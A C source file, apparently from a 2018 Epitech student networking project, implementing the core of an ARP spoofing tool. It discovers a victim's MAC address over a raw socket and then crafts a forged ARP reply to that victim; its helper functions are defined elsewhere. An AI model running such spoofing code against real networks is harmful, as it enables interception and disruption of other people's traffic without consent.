/*
** EPITECH PROJECT, 2018
** MYARPSPOOF
** File description:
** arpspoof.c
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include "spoof.h"

void print_victime(arp_header_t *arp_rep)
{
    printf("Found victim's MAC address: '");
    for (int i = 0; i < 6; ++i) {
        printf("%02X", arp_rep->sender_mac[i]);
        if (i < 5)
            printf(":");
    }
    printf("'\n");
}

void prepare_last_send(infohdr_t *rcv
    , infohdr_t *fsend
    , infohdr_t *lsend
    , char **av)
{
    lsend->eth = (struct ethhdr *)lsend->buf;
    lsend->arp = (arp_header_t *)(lsend->buf + ETH2_HEADER_LEN);
    fill_arp(lsend->arp, ARP_REPLY, NULL, 0);
    fill_arp_eth(lsend->eth, lsend->arp, &lsend->sock_addr, &fsend->if_mac);
    fill_sock_addr(&lsend->sock_addr, fsend->ifindex);
    fill_arp_send_target(lsend->arp, av[0], av[1]);
    for (int i = 0; i < MAC_LENGTH; ++i) {
        lsend->eth->h_dest[i] = rcv->arp->sender_mac[i];
        lsend->arp->target_mac[i] = rcv->arp->sender_mac[i];
    }
}

static void arpspoof(int sd, infohdr_t *fsend, char **av)
{
    infohdr_t recv;

    fsend->eth = (struct ethhdr *)fsend->buf;
    fsend->arp = (arp_header_t *)(fsend->buf + ETH2_HEADER_LEN);
    memset(fsend->buf, 0x00, BUF_SIZE);
    fill_arp(fsend->arp, ARP_REQUEST, NULL, 0);
    fill_arp_eth(fsend->eth, fsend->arp, &fsend->sock_addr, &fsend->if_mac);
    fill_sock_addr(&fsend->sock_addr, fsend->ifindex);
    fill_arp_send_target(fsend->arp, av[0], av[1]);
    send_arp(sd, fsend);
    receiv_arp(sd, fsend, &recv, av);
}

int init_arpspoof(int ac, char **av)
{
    int sd = 0;
    infohdr_t fsend;

    if (ac >= 5)
        return (print_function(av));
    if (!create_socket(&sd))
        return (FAILURE);
    if (!check_ioctl(sd, SIOCGIFINDEX, &fsend.if_mac, av[2]))
        return (FAILURE);
    fsend.ifindex = fsend.if_mac.ifr_ifindex;
    if (!check_ioctl(sd, SIOCGIFHWADDR, &fsend.if_mac, av[2]))
        return (FAILURE);
    arpspoof(sd, &fsend, av);
    close(sd);
    return (SUCCESS);
}